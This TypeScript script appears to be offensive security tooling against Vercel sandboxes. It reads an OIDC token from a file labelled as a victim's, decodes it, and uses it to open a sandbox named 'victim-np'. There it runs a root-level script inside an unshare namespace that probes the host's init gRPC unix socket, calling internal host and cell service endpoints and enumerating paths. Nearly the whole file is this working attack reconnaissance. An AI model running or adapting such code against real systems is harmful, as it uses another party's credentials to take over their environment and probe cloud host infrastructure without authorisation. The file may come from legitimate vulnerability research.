import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "=== 1. ls share ==="
ls -la /run/vercel/share/ 2>&1
echo "=== 2. can we read/write the socket? ==="
test -S /run/vercel/share/init.sock && echo "it's a socket" || echo "not a socket"
ls -la /run/vercel/share/init.sock
echo "=== 3. socket perms ==="
stat /run/vercel/share/init.sock 2>&1 | head -5
echo "=== 4. connect to init.sock with curl unix socket ==="
printf '\\x00\\x00\\x00\\x00\\x00' > /tmp/empty.msg
timeout 3 curl -s --unix-socket /run/vercel/share/init.sock -o /tmp/init_out -w "http_code=%{http_code}\\n" \\
  -H 'Content-Type: application/grpc' -H 'TE: trailers' -H 'Content-Length: 5' \\
  --data-binary @/tmp/empty.msg http://localhost/vercel.hive.host.api.v1.HostService/GetResourceUsage 2>&1 | tail -3
head -c 400 /tmp/init_out 2>/dev/null; echo ""
echo "=== 5. HTTP GET on socket ==="
timeout 3 curl -s --unix-socket /run/vercel/share/init.sock http://localhost/ 2>&1 | head -c 300; echo ""
echo "=== 6. other paths on socket ==="
for p in "/health" "/status" "/ping" "/v1/status" "/vercel.hive.api.cells.v1.CellService/GetCellAddress" "/vercel.hive.host.api.v1.HostService/GetResourceUsage"; do
  timeout 2 curl -s --unix-socket /run/vercel/share/init.sock -o /tmp/x -w "%{http_code} " "http://localhost$p" 2>/dev/null
done
echo ""
echo "=== 7. what connects to the socket? fuser/lsof ==="
fuser /run/vercel/share/init.sock 2>&1 | head -3
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore38.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore38.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
